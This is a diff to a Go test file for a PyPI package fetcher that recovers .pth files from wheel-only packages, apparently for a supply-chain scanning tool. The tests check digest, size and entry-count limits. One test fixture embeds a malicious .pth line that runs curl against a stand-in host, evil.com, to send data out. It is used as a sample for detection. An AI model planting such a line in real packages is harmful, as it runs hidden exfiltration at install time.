@@ -2,6 +2,7 @@ package pypi
 
 import (
 	"archive/tar"
+	"archive/zip"
 	"bytes"
 	"compress/gzip"
 	"context"
@@ -56,6 +57,28 @@ func gzipBytes(t *testing.T, b []byte) []byte {
 		t.Fatal(err)
 	}
 	if err := gz.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return buf.Bytes()
+}
+
+// makeZip builds an in-memory wheel-shaped zip for extractPthFromZip (which
+// reads the already-downloaded byte stream).
+func makeZip(t *testing.T, files [][2]string) []byte {
+	t.Helper()
+	var buf bytes.Buffer
+	zw := zip.NewWriter(&buf)
+	for _, f := range files {
+		name, content := f[0], f[1]
+		w, err := zw.Create(name)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := w.Write([]byte(content)); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := zw.Close(); err != nil {
 		t.Fatal(err)
 	}
 	return buf.Bytes()
@@ -205,6 +228,10 @@ func jsonWithSdist(url, sha string, size int64) string {
 	return fmt.Sprintf(`{"urls":[{"packagetype":"sdist","url":%q,"size":%d,"digests":{"sha256":%q}}]}`, url, size, sha)
 }
 
+func jsonWithWheel(url, sha string, size int64) string {
+	return fmt.Sprintf(`{"urls":[{"packagetype":"bdist_wheel","url":%q,"size":%d,"digests":{"sha256":%q}}]}`, url, size, sha)
+}
+
 func TestDigestMismatchIsGap(t *testing.T) {
 	tgz := gzipBytes(t, makeTar(t, [][2]string{{"pkg-1.0/setup.py", "import os"}}))
 	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
@@ -305,12 +332,18 @@ func TestDeclaredOversizeSdistIsGapNotWheelOnly(t *testing.T) {
 	}
 }
 
-// The control: a package that genuinely publishes ONLY wheels is a normal,
-// complete result. If this gated, every wheel-only dependency would fail a scan.
+// The control: a package that genuinely publishes ONLY wheels, whose wheel
+// carries no .pth file, is a normal, complete result. If this gated, every
+// wheel-only dependency would fail a scan.
 func TestGenuinelyWheelOnlyStaysClean(t *testing.T) {
+	zipBytes := makeZip(t, [][2]string{{"pkg/__init__.py", "pass"}})
+	sum := sha256.Sum256(zipBytes)
 	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
-	body := `{"urls":[{"packagetype":"bdist_wheel","url":"https://files.pythonhosted.org/pkg-1.0.whl","size":100}]}`
-	f := fetcherWith(map[string][]byte{jsonURL: []byte(body)})
+	wheelURL := "https://files.pythonhosted.org/pkg-1.0-py3-none-any.whl"
+	f := fetcherWith(map[string][]byte{
+		jsonURL:  []byte(jsonWithWheel(wheelURL, hex.EncodeToString(sum[:]), int64(len(zipBytes)))),
+		wheelURL: zipBytes,
+	})
 
 	got, err := f.Fetch(context.Background(), "pkg", "1.0")
 	if err != nil {
@@ -318,6 +351,9 @@ func TestGenuinelyWheelOnlyStaysClean(t *testing.T) {
 	}
 	if !got.WheelOnly {
 		t.Error("a package publishing only wheels must be recorded as wheel-only")
+	}
+	if len(got.PthFiles) != 0 {
+		t.Errorf("a wheel with no .pth entries must recover none, got %+v", got.PthFiles)
 	}
 }
 
@@ -396,4 +432,106 @@ func TestAllowedSdistHost(t *testing.T) {
 			t.Errorf("%q should be refused", h)
 		}
 	}
+}
+
+// Item 3b: wheel-only .pth recovery. A wheel-only package is no longer a dead
+// end for install-surface analysis — its .pth files, if any, are the one piece
+// of install-time evidence a wheel can still disclose.
+
+func TestWheelOnlyRecoversPthFile(t *testing.T) {
+	zipBytes := makeZip(t, [][2]string{
+		{"evil.pth", "import os; os.system('curl https://evil.com/exfil')"},
+	})
+	sum := sha256.Sum256(zipBytes)
+	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
+	wheelURL := "https://files.pythonhosted.org/pkg-1.0-py3-none-any.whl"
+	f := fetcherWith(map[string][]byte{
+		jsonURL:  []byte(jsonWithWheel(wheelURL, hex.EncodeToString(sum[:]), int64(len(zipBytes)))),
+		wheelURL: zipBytes,
+	})
+
+	files, err := f.Fetch(context.Background(), "pkg", "1.0")
+	if err != nil {
+		t.Fatalf("wheel-only .pth recovery: %v", err)
+	}
+	if !files.WheelOnly {
+		t.Error("expected WheelOnly=true")
+	}
+	if files.PthFiles["evil.pth"] == "" {
+		t.Fatalf("expected evil.pth to be recovered from the wheel, got %+v", files.PthFiles)
+	}
+}
+
+// Mirrors TestDeclaredOversizeSdistIsGapNotWheelOnly: a wheel that EXISTS but
+// declares a size over the cap must gap, not silently read as "no wheel".
+func TestOversizedWheelIsGapNotSilentSkip(t *testing.T) {
+	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
+	body := fmt.Sprintf(
+		`{"urls":[{"packagetype":"bdist_wheel","url":"https://files.pythonhosted.org/pkg-1.0-py3-none-any.whl",`+
+			`"size":%d,"digests":{"sha256":"%s"}}]}`,
+		maxWheelSize+1, strings.Repeat("a", 64))
+	f := fetcherWith(map[string][]byte{jsonURL: []byte(body)})
+
+	got, err := f.Fetch(context.Background(), "pkg", "1.0")
+	if err == nil {
+		t.Fatalf("declared-oversize wheel returned no error; got %+v (WheelOnly=%v)", got, got.WheelOnly)
+	}
+	if !errors.Is(err, ErrSdistTooLarge) {
+		t.Errorf("err = %v, want ErrSdistTooLarge", err)
+	}
+}
+
+func TestWheelDigestMismatchIsGap(t *testing.T) {
+	zipBytes := makeZip(t, [][2]string{{"evil.pth", "import evil"}})
+	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
+	wheelURL := "https://files.pythonhosted.org/pkg-1.0-py3-none-any.whl"
+	wrong := strings.Repeat("a", 64)
+	f := fetcherWith(map[string][]byte{
+		jsonURL:  []byte(jsonWithWheel(wheelURL, wrong, int64(len(zipBytes)))),
+		wheelURL: zipBytes,
+	})
+
+	if _, err := f.Fetch(context.Background(), "pkg", "1.0"); !errors.Is(err, ErrSdistDigestMismatch) {
+		t.Fatalf("bad wheel digest: err=%v, want ErrSdistDigestMismatch", err)
+	}
+}
+
+func TestWheelEntryFloodIsGap(t *testing.T) {
+	defer func(v int) { maxZipEntries = v }(maxZipEntries)
+	maxZipEntries = 5
+	var files [][2]string
+	for i := 0; i < 20; i++ {
+		files = append(files, [2]string{fmt.Sprintf("f%d.txt", i), "x"})
+	}
+	if _, err := extractPthFromZip(makeZip(t, files)); !errors.Is(err, ErrSdistTooManyEntries) {
+		t.Fatalf("wheel entry flood: err=%v, want ErrSdistTooManyEntries", err)
+	}
+}
+
+// Mirrors TestPthCountOverflowIsGap / TestPthByteOverflowIsGap: the tar path's
+// .pth retention caps apply identically on the zip path, since it is the same
+// resource being protected.
+func TestWheelPthRetentionCapsApply(t *testing.T) {
+	t.Run("count", func(t *testing.T) {
+		defer func(v int) { maxPthFiles = v }(maxPthFiles)
+		maxPthFiles = 2
+		var files [][2]string
+		for i := 0; i < 10; i++ {
+			files = append(files, [2]string{fmt.Sprintf("p%d.pth", i), "import x"})
+		}
+		if _, err := extractPthFromZip(makeZip(t, files)); !errors.Is(err, ErrSdistRetentionExceeded) {
+			t.Fatalf("wheel .pth count overflow: err=%v, want ErrSdistRetentionExceeded", err)
+		}
+	})
+	t.Run("bytes", func(t *testing.T) {
+		defer func(v int64) { maxPthTotalBytes = v }(maxPthTotalBytes)
+		maxPthTotalBytes = 20
+		var files [][2]string
+		for i := 0; i < 10; i++ {
+			files = append(files, [2]string{fmt.Sprintf("p%d.pth", i), strings.Repeat("z", 15)})
+		}
+		if _, err := extractPthFromZip(makeZip(t, files)); !errors.Is(err, ErrSdistRetentionExceeded) {
+			t.Fatalf("wheel .pth byte overflow: err=%v, want ErrSdistRetentionExceeded", err)
+		}
+	})
 }
